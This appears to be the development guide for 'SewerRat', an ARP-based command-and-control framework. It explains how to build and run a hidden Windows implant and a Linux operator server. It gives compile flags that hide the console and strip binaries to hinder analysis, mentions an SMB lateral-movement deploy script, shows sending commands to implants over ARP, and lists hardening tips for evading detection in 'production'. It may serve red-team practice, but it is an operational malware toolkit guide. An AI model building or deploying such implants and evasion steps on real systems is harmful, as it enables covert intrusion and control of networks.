# SewerRat C2: Development Guide

## Overview

SewerRat is a **Layer 2 Command & Control framework** that operates at the Data Link layer (ARP) to bypass traditional firewalls and EDR socket monitoring. This guide covers building, deploying, and testing the project.

## System Requirements

### For Building
- **Go 1.20+** ([https://golang.org/](https://golang.org/))
- **Make** (or execute commands manually)
- Linux/macOS for building the server
- Windows for cross-compiling implant (or use WSL2)

### For Running Implant
- **Windows Server 2022** (target)
- **Npcap** installed (packet capture library) - [https://nmap.org/npcap/](https://nmap.org/npcap/)
- Administrator privileges

### For Running Server
- **Linux** (Kali, Ubuntu, CentOS, etc.)
- Direct network access to target LAN
- Packet capture permissions (`sudo` or CAP_NET_ADMIN)

## Installation & Build

### Step 1: Clone/Setup Repository

```bash
cd /path/to/sewerrat
ls -la  # verify structure
```

### Step 2: Install Go Dependencies

```bash
go mod download
go mod tidy
```

### Step 3: Build Binaries

```bash
# Build everything
make all

# Or build individually:
make implant    # Windows SewerRat.exe
make server     # Linux sewerrat-server
```

Built artifacts go to `dist/`:
- `dist/SewerRat.exe` — Windows implant (for target)
- `dist/sewerrat-server` — Linux server (for operator)

### Building on Windows (PowerShell)

If you need to build on Windows:

```powershell
# Build server (if WSL2 available)
wsl make server

# Or manually:
go build -o dist/sewerrat-server ./cmd/server
```

## Project Structure

```
sewerrat/
├── shared/              # Protocol encoding/decoding, crypto stubs
│   ├── constants.go     # ARP magic marker, sizes, timeouts
│   ├── protocol.go      # Payload encode/decode, chunking
│   └── crypto.go        # XOR cipher (PoC stage)
│
├── implant/             # Windows beacon code
│   ├── network.go       # Interface detection, pcap setup
│   ├── sniffer.go       # ARP packet capture and magic byte filter
│   ├── executor.go      # Command execution with timeout
│   └── broadcaster.go   # ARP response sender
│
├── server/              # Linux C2 listener & command sender
│   ├── broadcaster.go   # ARP command broadcast
│   ├── listener.go      # ARP response receiver
│   └── cli.go          # Interactive command interface
│
├── cmd/
│   ├── implant/main.go  # Windows implant entry point
│   └── server/main.go   # Linux server entry point
│
├── scripts/
│   └── deploy.py        # SMB lateral movement helper
│
├── docs/                # This documentation
├── Makefile             # Build automation
└── go.mod              # Dependencies
```

## Dependency Management

### Go Dependencies

The project relies on:
- **google/gopacket** — Packet crafting and sniffing
  - Provides BPF filtering, raw frame construction, ARP layer support
  - Auto-installed via `go mod download`

### Windows-Specific Dependencies

- **Npcap SDK** (not required to compile, but to run on Windows)
  - Download: https://nmap.org/npcap/
  - Install on target Windows Server before deploying implant
  - Alternative: Bundle npcap-config.exe with implant package

### Python Deployment Scripts

If using `deploy.py`:
```bash
pip install impacket
```

## Compilation Flags

### Implant (Windows)

```bash
# Hide console window (GUI app, no console)
GOOS=windows GOARCH=amd64 go build -ldflags "-H=windowsgui -s -w" -o SewerRat.exe ./cmd/implant
```

Flags:
- `-H=windowsgui` — Subsystem=GUI (no cmd window spawned)
- `-s -w` — Strip binary, remove DWARF (reduces size & static analysis)
- `-trimpath` — Remove absolute paths from binary

### Server (Linux)

```bash
go build -trimpath -o sewerrat-server ./cmd/server
```

## Troubleshooting Build Issues

### Issue: `go: github.com/google/gopacket: version "v1.10.1" not found`

**Solution:** Update go.sum
```bash
go get -u github.com/google/gopacket
go mod tidy
```

### Issue: Windows cross-compile fails on Linux

**Solution:** Use WSL2 or Docker
```bash
# In WSL2:
GOOS=windows GOARCH=amd64 go build ./cmd/implant
```

### Issue: Npcap not found on Windows

**Solution:** Install Npcap from https://nmap.org/npcap/
- Download latest installer
- Install with "Npcap OEM" or standard edition
- Restart Windows server
- Verify: `wmic logicaldisk get name` (checks for device access)

## Development Workflow

### Local Testing (Same Machine)

```bash
# Terminal 1: Build and run implant (requires Npcap or libpcap)
make dev
./dist/sewerrat-dev-implant

# Terminal 2: Run server and send commands
sudo ./dist/sewerrat-dev-server -i eth0
# Input: broadcast whoami
```

### Cross-Machine Testing (Linux Server -> Windows VM)

```bash
# Build for Windows
make implant

# On Windows target:
# 1. Install Npcap
# 2. Copy SewerRat.exe to C:\temp\
# 3. Run: C:\temp\SewerRat.exe

# On Linux attacker:
sudo ./dist/sewerrat-server -i eth0
# Input: send <windows-mac> whoami
```

## Logging & Debugging

The implant logs (stderr) include:
- `[+]` — Success messages (interface found, beacon active)
- `[*]` — Info messages (command executed, etc.)
- `[!]` — Error/warning messages

To suppress implant logs in production, redirect stderr:
```powershell
C:\temp\SewerRat.exe 2>nul
```

## Performance Notes

- **Implant overhead**: ~5-10 MB memory, minimal CPU (idle in pcap loop)
- **Network overhead**: ~100 bytes per command/response (1 ARP frame + padding)
- **Latency**: 2-5 seconds per command (includes jitter delays)
- **Max command size**: 1024 bytes (split across multiple ARP frames if needed)
- **Max response size**: 4096 bytes (capped in executor.go)

## Security Considerations

### Current Implementation (PoC)

- ❌ No encryption (optional XOR stub available)
- ❌ Magic marker is hardcoded (0x13 0x37)
- ❌ No authentication/mutual verification
- ❌ Plaintext commands in ARP padding

### For Production Red Team

Enable in `shared/crypto.go`:
```go
shared.EncryptEnabled = true
```

Recommendations:
1. **Derive encryption key** from target credentials/AD
2. **Rotate magic marker** per engagement
3. **Add command authentication** (HMAC signature)
4. **Implement jitter+ strategy**: randomize trigger IP, beacon intervals
5. **Use padding entropy**: fill unused padding with random data

## Next Steps

1. **Read USAGE.md** — How to operate the C2 server
2. **Read PROTOCOL.md** — Technical protocol details
3. **Read TESTING.md** — Validation procedures

---

**Questions?** Review the code comments or examine packet traffic with Wireshark while running locally.
